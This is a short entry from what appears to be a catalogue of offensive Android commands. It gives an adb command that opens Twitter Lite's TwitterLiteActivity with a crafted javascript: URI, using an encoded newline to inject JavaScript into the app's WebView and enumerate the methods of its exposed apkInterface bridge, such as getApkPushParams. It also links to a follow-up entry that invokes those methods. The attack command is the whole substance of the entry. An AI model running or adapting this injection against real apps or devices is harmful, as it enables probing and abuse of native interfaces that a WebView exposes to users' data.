---
data: >-
  adb shell am start -a "android.intent.action.VIEW" -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window.apkInterface).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"
tags:
  - adb
  - js-injection
  - enumeration
type: command
output: >-
  Lists 5 objects/properties of apkInterface, including methods like
  getApkPushParams
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.820Z'
id: 1c7744eb-2b76-4129-b09a-9085c05cc46c
verified: false
validated: true
submitted: true
---
# adb-enumerate-apkinterface-properties-in-twitterlite

## Command

```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window.apkInterface).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"
```

## Description

Enumerates properties of the apkInterface object via JS injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -a | Action VIEW | Yes |
| -n | Component | Yes |
| -d | JS for apkInterface | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Target specific properties with additional JS.

## Expected Output

Listed methods including getApkPushParams.

## Related

- [[commands/adb-invoke-getapkpushparams-in-twitterlite]]
- [[procedures/Enumerate-apkInterface-Properties-via-JavaScript-Injection-in-TwitterLiteActivity]]
